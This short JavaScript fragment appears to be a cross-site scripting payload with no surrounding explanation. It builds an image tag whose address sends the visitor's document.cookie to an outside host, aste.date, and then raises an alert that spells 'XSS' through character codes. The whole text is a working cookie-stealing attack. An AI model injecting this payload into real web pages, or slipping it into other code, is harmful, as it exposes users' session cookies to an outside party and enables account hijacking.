img=document.createElement("img");
img.src="https://www.aste.date?"+escape(document.cookie);
document.body.appendChild(img);
alert(String.fromCharCode(88,83,83));
